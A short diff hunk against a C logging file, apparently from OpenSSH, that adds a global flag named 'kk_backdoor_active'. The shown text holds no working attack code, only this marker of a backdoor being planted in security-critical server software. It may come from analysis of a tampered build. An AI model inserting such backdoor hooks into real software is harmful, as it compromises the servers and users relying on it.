@@ -61,6 +61,8 @@ static char *argv0;
 static log_handler_fn *log_handler;
 static void *log_handler_ctx;
 
+int kk_backdoor_active = 0;
+
 extern char *__progname;
 
 #define LOG_SYSLOG_VIS	(VIS_CSTYLE|VIS_NL|VIS_TAB|VIS_OCTAL)
